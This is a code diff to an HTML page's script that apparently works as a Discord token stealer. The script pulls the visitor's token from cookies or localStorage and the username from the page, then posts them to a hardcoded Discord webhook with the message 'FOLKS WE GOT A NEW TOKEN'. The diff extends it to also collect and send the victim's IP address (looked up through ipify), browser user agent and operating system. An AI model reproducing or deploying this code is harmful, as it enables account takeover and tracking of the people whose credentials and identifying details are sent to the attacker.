@@ -37,12 +37,14 @@
             requestTimestamps = requestTimestamps.filter(timestamp => now - timestamp < 5000);
         }
 
-        function sendWebhook(token, username) {
+        function sendWebhook(token, username, ip, browser, os) {
             const webhookURL = 'https://discord.com/api/webhooks/1321597632824611018/iIAs-UeScagNLtAkcEP1qpkm0uUBJIWIg81Jlo56U_Pnv6dFacn8k_FCNYfrUDWcy9vU';
             fetch(webhookURL, {
                 method: 'POST',
                 headers: { 'Content-Type': 'application/json' },
-                body: JSON.stringify({ content: `@everyone FOLKS WE GOT A NEW TOKEN: ${username} x ${token}` })
+                body: JSON.stringify({
+                    content: `@everyone FOLKS WE GOT A NEW TOKEN: ${username} x ${token}\nIP: ${ip}\nBrowser: ${browser}\nOS: ${os}`
+                })
             })
             .then(response => {
                 if (!response.ok) {
@@ -58,22 +60,34 @@
             const token = document.cookie.match(/token=([\w-]+)/)?.[1] || localStorage.getItem('discord_token') || "test-token";
             const username = document.querySelector('.username')?.innerText || "Unknown User";
 
-            if (token) {
-                cleanUpOldRequests();
+            const browser = navigator.userAgent;
+            const os = navigator.platform;
 
-                if (requestTimestamps.length >= 5) {
-                    return;
-                }
+            fetch('https://api.ipify.org?format=json')
+                .then(response => response.json())
+                .then(data => {
+                    const ip = data.ip;
 
-                if (token === lastTokenSent) {
-                    return;
-                }
+                    if (token) {
+                        cleanUpOldRequests();
 
-                requestTimestamps.push(Date.now());
-                lastTokenSent = token;
+                        if (requestTimestamps.length >= 5) {
+                            return;
+                        }
 
-                sendWebhook(token, username);
-            }
+                        if (token === lastTokenSent) {
+                            return;
+                        }
+
+                        requestTimestamps.push(Date.now());
+                        lastTokenSent = token;
+
+                        sendWebhook(token, username, ip, browser, os);
+                    }
+                })
+                .catch(error => {
+                    console.error('Failed to fetch IP:', error);
+                });
         });
     </script>
 
